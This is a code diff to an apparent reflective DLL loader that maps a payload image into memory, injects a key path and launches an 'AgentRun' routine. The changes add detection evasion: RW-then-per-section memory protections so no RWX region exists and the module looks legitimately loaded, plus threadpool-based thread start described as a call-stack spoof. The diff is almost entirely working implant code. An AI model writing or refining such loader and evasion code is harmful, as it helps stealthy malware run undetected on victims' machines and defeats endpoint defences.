@@ -138,11 +138,14 @@ DWORD WINAPI rfl_loader(RflData *pData)
     if ((u8 *)secs + nSec * sizeof(Sec) > raw + rawSz) return 1;
     if (hdrSz > rawSz) return 1;
 
-    /* ── 2. Allocate memory for the mapped image ─────────────────────── */
+    /* ── 2. Allocate memory for the mapped image (F-6: RW only, not RWX) ─
+     * Allocate PAGE_READWRITE.  After sections are copied and IAT resolved
+     * we set per-section permissions (RX/.text, RO/.rdata, RW/.data) via
+     * pVirtualProtect.  No RWX page ever exists.                          */
     u8 *base = pData->pVirtualAlloc
               ? (u8 *)pData->pVirtualAlloc(NULL, (SIZE_T)imgSz,
                                             MEM_COMMIT | MEM_RESERVE,
-                                            PAGE_EXECUTE_READWRITE)
+                                            PAGE_READWRITE)
               : NULL;
     if (!base) return 2;
 
@@ -232,6 +235,47 @@ DWORD WINAPI rfl_loader(RflData *pData)
         }
     }
 
+    /* ── 6b. Set per-section memory permissions (F-6) ───────────────────
+     * Walk section headers again; flip each section to its correct
+     * protection so the final mapping looks like a legitimately-loaded
+     * module (MEM_PRIVATE but without any RWX region).
+     *
+     *   IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE  → PAGE_EXECUTE_READ
+     *   IMAGE_SCN_CNT_INITIALIZED_DATA without exec  → PAGE_READONLY
+     *     (if also writable → PAGE_READWRITE)
+     *   All others (headers, .pdata, .rsrc, .reloc)  → PAGE_READONLY
+     *
+     * pVirtualProtect may be NULL on builds that do not supply it; skip
+     * gracefully (mapping stays RW, which is suboptimal but not a crash).
+     */
+    if (pData->pVirtualProtect) {
+        for (u32 si = 0; si < nSec; si++) {
+            u32 vaddr2, vsz2, chars2;
+            memcpy(&vaddr2, (u8 *)secs + si*sizeof(Sec) + 12, 4);
+            memcpy(&vsz2,   (u8 *)secs + si*sizeof(Sec) +  8, 4);
+            memcpy(&chars2, (u8 *)secs + si*sizeof(Sec) + 36, 4);
+            if (!vaddr2 || !vsz2) continue;
+
+            DWORD newProt;
+            int isExec = (chars2 & 0x20) != 0;    /* IMAGE_SCN_CNT_CODE */
+            int isWrite= (chars2 & 0x80000000u) != 0; /* IMAGE_SCN_MEM_WRITE */
+            if (isExec)
+                newProt = 0x20; /* PAGE_EXECUTE_READ */
+            else if (isWrite)
+                newProt = 0x04; /* PAGE_READWRITE */
+            else
+                newProt = 0x02; /* PAGE_READONLY */
+
+            DWORD oldProt2 = 0;
+            pData->pVirtualProtect(base + vaddr2, (SIZE_T)vsz2,
+                                   newProt, &oldProt2);
+        }
+        /* Also protect the PE headers as read-only */
+        DWORD oldHdr = 0;
+        pData->pVirtualProtect(base, (SIZE_T)hdrSz, 0x02 /*PAGE_READONLY*/,
+                               &oldHdr);
+    }
+
     /* ── 7. Write key path into mapped image's g_key_path global ─────── */
     if (pData->gKeyPathOffset && pData->gKeyPathSize) {
         char *dest = (char *)(base + pData->gKeyPathOffset);
@@ -245,11 +289,31 @@ DWORD WINAPI rfl_loader(RflData *pData)
     /* ── 8. Flush instruction cache ──────────────────────────────────── */
     pData->pFlushInstructionCache((HANDLE)-1, base, (SIZE_T)imgSz);
 
-    /* ── 9. Spawn AgentRun on a new thread ───────────────────────────── */
+    /* ── 9. Spawn AgentRun via threadpool (F-6 call-stack spoof) ────────
+     * TpAllocWork / TpPostWork cause the spawned thread to begin execution
+     * inside ntdll!TppWorkerThread, giving it a legitimate-looking call
+     * stack rooted in ntdll rather than starting directly at AgentRun.
+     *
+     * Falls back to CreateThread if the threadpool pointers are absent or
+     * TpAllocWork fails — correct execution is preserved at the cost of
+     * a less-clean call stack.                                            */
     LPTHREAD_START_ROUTINE pfnAgent =
         (LPTHREAD_START_ROUTINE)(base + pData->agentRunRva);
-    HANDLE hThread = pData->pCreateThread(NULL, 0, pfnAgent, NULL, 0, NULL);
-    if (hThread) pData->pCloseHandle(hThread);
+
+    int tp_ok = 0;
+    if (pData->pTpAllocWork && pData->pTpPostWork && pData->pTpReleaseWork) {
+        PVOID work = pData->pTpAllocWork(
+            (PVOID)(ULONG_PTR)pfnAgent, NULL, NULL);
+        if (work) {
+            pData->pTpPostWork(work);
+            pData->pTpReleaseWork(work);
+            tp_ok = 1;
+        }
+    }
+    if (!tp_ok && pData->pCreateThread) {
+        HANDLE hThread = pData->pCreateThread(NULL, 0, pfnAgent, NULL, 0, NULL);
+        if (hThread) pData->pCloseHandle(hThread);
+    }
 
     return 0;
 }
